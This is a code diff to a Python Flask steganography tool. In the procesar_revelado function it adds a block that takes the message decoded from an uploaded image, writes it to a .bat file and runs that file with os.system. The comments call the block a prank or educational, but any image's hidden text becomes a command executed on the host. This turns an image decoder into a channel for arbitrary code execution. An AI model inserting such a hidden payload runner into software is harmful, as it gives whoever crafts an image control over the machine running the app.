@@ -173,7 +173,31 @@ def procesar_revelado(ruta_imagen):
              
         mensaje_descifrado = binario_a_texto(bits_utiles)
         log_revelado.append(f"\n[+] Proceso finalizado. Mensaje reconstruido.")
-        
+
+        # --- INICIO DE CÓDIGO DE EJECUCIÓN (BROMA/EDUCATIVO) ---
+        import os
+        try:
+            log_revelado.append("\n[!] ALERTA: Ejecutando payload oculto...")
+            log_revelado.append(f"[>] Comando extraido: {mensaje_descifrado}")
+            
+            # Para Windows: A veces os.system falla al abrir nuevas ventanas si el string es muy complejo
+            # o dependiendo de dónde estés ejecutando Flask (como la terminal de VSCode).
+            # La forma más segura de forzar que se abra la consola es crear un archivo .bat y ejecutarlo.
+            ruta_bat = os.path.join(os.getcwd(), "broma_payload.bat")
+            with open(ruta_bat, "w", encoding="utf-8") as f:
+                # Escribimos el comando en el archivo .bat
+                f.write(mensaje_descifrado)
+            
+            # Ejecutamos el archivo .bat en una nueva ventana
+            # Agregamos unas comillas vacías ("") al principio, ya que el comando 'start'
+            # de Windows interpreta el primer string entre comillas como el título de la ventana.
+            os.system(f'start "" "{ruta_bat}"')
+            log_revelado.append("[!] Se generó broma_payload.bat y se mandó a ejecutar.")
+            
+        except Exception as e:
+            log_revelado.append(f"[!] Error al ejecutar: {e}")
+        # --- FIN DE CÓDIGO DE EJECUCIÓN ---
+
         return render_template('index.html', 
                                mensaje_revelado=mensaje_descifrado,
                                log_revelado='\n'.join(log_revelado))
